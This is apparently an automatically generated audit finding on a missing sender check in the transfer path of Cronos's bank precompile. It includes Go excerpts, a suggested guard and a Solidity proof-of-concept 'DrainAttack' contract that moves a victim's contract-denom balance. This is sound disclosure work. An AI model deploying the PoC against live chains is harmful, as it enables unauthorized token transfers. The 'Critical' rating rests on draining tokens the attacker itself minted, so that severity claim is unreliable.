### Title
Missing Caller Authorization in `BankContract.Run` Transfer — Unauthorized EVM-Denom Token Drain - (`x/cronos/keeper/precompiles/bank.go`)

### Summary

The `TransferMethodName` branch of `BankContract.Run` accepts an arbitrary `sender` address from ABI-decoded calldata and passes it directly to `bankKeeper.SendCoins` without ever verifying that `contract.Caller() == sender`. Any contract can therefore drain any account's balance of its own EVM denom (`evm/<callerContract>`) without the account's consent.

### Finding Description

In `BankContract.Run`, the `transfer` case: [1](#0-0) 

```go
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
if err := bc.checkBlockedAddr(to); err != nil { // only guards the recipient
    return nil, err
}
denom := EVMDenom(contract.Caller())             // "evm/<callerContract>"
...
bc.bankKeeper.SendCoins(ctx, from, to, ...)      // from == attacker-supplied sender
```

There is **no assertion** that `contract.Caller() == sender`. Compare with `mint`/`burn`, where the denom is also `EVMDenom(contract.Caller())` but the recipient/target address is at least constrained by `checkBlockedAddr`. For `transfer`, neither the `from` address nor the relationship between `from` and the calling contract is validated. [2](#0-1) 

`EVMDenom(contract.Caller())` returns `"evm/" + callerContract.Hex()`, so the denom in play is always the calling contract's own denom — but the *source* of the funds is fully attacker-supplied.

### Impact Explanation

A malicious contract `0xEvil` deployed by an unprivileged user can:

1. Mint `evm/0xEvil` tokens to any victim (including a blocked address) via `bank.mint(victim, amount)` — no authorization needed since the contract controls its own denom.
2. Immediately call `bank.transfer(victim, attacker, amount)` — `checkBlockedAddr` passes because `attacker` is not blocked, and `SendCoins(victim, attacker, amount)` executes unconditionally.

The victim's entire `evm/0xEvil` balance is drained without any signature or approval from the victim. This is an unauthorized transfer of precompile-controlled assets, matching the Critical impact category.

For the specific blocked-address scenario in the question: `checkBlockedAddr(to=attacker)` passes (attacker is not blocked), and there is no check that prevents `SendCoins` from moving funds *out of* a blocked address. The Cosmos SDK's `SendCoins` does not consult the Cronos block list for the sender.

### Likelihood Explanation

Reachable by any unprivileged EVM transaction. Deploying a contract and calling the bank precompile requires no special permissions. The only precondition is that the victim holds a nonzero balance of the calling contract's EVM denom, which the attacker can arrange by calling `bank.mint` first.

### Recommendation

Add a caller-equality guard at the top of the `TransferMethodName` branch:

```go
if sender != contract.Caller() {
    return nil, errors.New("bank transfer: sender must be the calling contract")
}
```

This mirrors the implicit trust model already present in `mint`/`burn` (where the denom is scoped to `contract.Caller()` and the target address is the only free parameter).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address to, uint256 amount) external returns (bool);
    function transfer(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DrainAttack {
    IBank constant bank = IBank(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to victim (blocked or otherwise)
    function setup(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this> balance to attacker — no victim signature needed
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

After `setup(blockedAddr, 1000)`, calling `drain(blockedAddr, attacker, 1000)` succeeds: `checkBlockedAddr(to=attacker)` passes, and `SendCoins(blockedAddr, attacker, 1000evm/<DrainAttack>)` executes, leaving `blockedAddr` with zero balance of that denom.
